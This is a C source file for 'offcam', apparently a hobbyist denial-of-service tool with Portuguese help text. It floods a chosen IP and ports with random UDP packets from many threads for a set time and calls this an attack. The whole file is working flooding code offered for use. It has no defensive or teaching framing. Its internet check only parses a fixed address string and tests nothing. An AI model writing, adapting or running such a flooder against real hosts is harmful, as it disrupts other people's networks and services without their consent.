#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>

#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

                                  
// _____ ___ ___    _____           
//|     |  _|  _|  |     |___ _____ 
//|  |  |  _|  _|  |   --| .'|     |
//|_____|_| |_|    |_____|__,|_|_|_|
                                  
void show_banner() {
    printf(RED" _____ ___ ___   "BLUE" _____          \n"RESET);
    printf(RED "|     |  _|  _|  "BLUE"|     |___ _____ \n" RESET);
    printf(RED "|  |  |  _|  _|  "BLUE"|   --| .'|     |\n" RESET);
    printf(RED "|_____|_| |_|    "BLUE"|_____|__,|_|_|_|\n\n" RESET);
}

int internet_connection() {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, "8.8.8.8", &(sa.sin_addr)) != 0;
}

void *send_random_udp_packets(void *arg) {
    struct sockaddr_in *target = (struct sockaddr_in *)arg;
    char random_data[1024];
    int sock;
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        perror(RED "[-]"RESET" Erro ao criar socket" RESET);
        return NULL;
    }

    for (int i = 0; i < sizeof(random_data); i++) {
        random_data[i] = rand() % 256;
    }

    if (sendto(sock, random_data, sizeof(random_data), 0, (struct sockaddr *)target, sizeof(*target)) == -1) {
        perror(RED "[-]"RESET" Erro ao enviar pacote UDP" RESET);
    } else {
        printf(GREEN "[+]"RESET" Enviado pacote UDP aleatório\n" RESET);
    }

    close(sock);
    return NULL;
}

void multiple_threads(char *ip, int *ports, int total_ports, int total_threads, int duration) {
    pthread_t threads[total_ports * total_threads];
    struct sockaddr_in targets[total_ports];

    for (int i = 0; i < total_ports; i++) {
        targets[i].sin_family = AF_INET;
        targets[i].sin_port = htons(ports[i]);
        inet_pton(AF_INET, ip, &targets[i].sin_addr);
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        for (int i = 0; i < total_ports; i++) {
            for (int j = 0; j < total_threads; j++) {
                pthread_create(&threads[i * total_threads + j], NULL, send_random_udp_packets, (void *)&targets[i]);
            }
        }

        for (int i = 0; i < total_ports * total_threads; i++) {
            pthread_join(threads[i], NULL);
        }
    }
}

void show_help() {
    printf("Uso:\n");
    printf("./offcam <IP alvo> <portas> <número de threads> [opções adicionais]\n\n");
    
    printf("Argumentos obrigatórios:\n");
    printf("  - IP alvo: Endereço IP do alvo\n");
    printf("  - Portas: Portas separadas por vírgula (ex: 80,443)\n");
    printf("  - Número de threads: Quantidade de threads por porta\n\n");
    
    printf("Opções adicionais:\n");
    printf("  -d <duração>: Define a duração do ataque em segundos (ex: -d 30)\n");
    printf("  -l          : Exibe log detalhado de cada pacote enviado\n");
    printf("  -h          : Exibe esta mensagem de ajuda\n\n");
    
    printf("Exemplo de uso:\n");
    printf("  ./offcam 192.168.0.1 80,443 5 -d 30 -l\n");
    printf("    => Envia pacotes para o IP 192.168.0.1 nas portas 80 e 443 com 5 threads por porta, durante 30 segundos, e exibe o log dos pacotes enviados.\n");
}


int main(int argc, char *argv[]) {
    show_banner();

    if (!internet_connection()) {
        printf(RED "[-]"RESET" Sem conexão com a internet\n" RESET);
        return 1;
    }

    if (argc < 4) {
        printf(RED "[-]"RESET" Argumentos insuficientes.\n" RESET);
        show_help();
        return 1;
    }

    char *ip = argv[1];
    char *port_str = argv[2];
    int num_threads = atoi(argv[3]);
    int duration = 10;
    int log_enabled = 0;

    for (int i = 4; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            duration = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-l") == 0) {
            log_enabled = 1;
        } else if (strcmp(argv[i], "-h") == 0) {
            show_help();
            return 0;
        } else {
            printf(RED "[-]"RESET" Opção desconhecida: %s\n" RESET, argv[i]);
            show_help();
            return 1;
        }
    }

    int ports[10];
    int total_ports = 0;
    char *token = strtok(port_str, ",");
    while (token != NULL && total_ports < 10) {
        ports[total_ports++] = atoi(token);
        token = strtok(NULL, ",");
    }

    srand(time(NULL));
    printf(BLUE "[!]"RESET" Iniciando ataque por %d segundos...\n" RESET, duration);
    multiple_threads(ip, ports, total_ports, num_threads, duration);

    printf(GREEN "[@lalaio1]"RESET" > Ataque finalizado.\n" RESET);
    return 0;
}
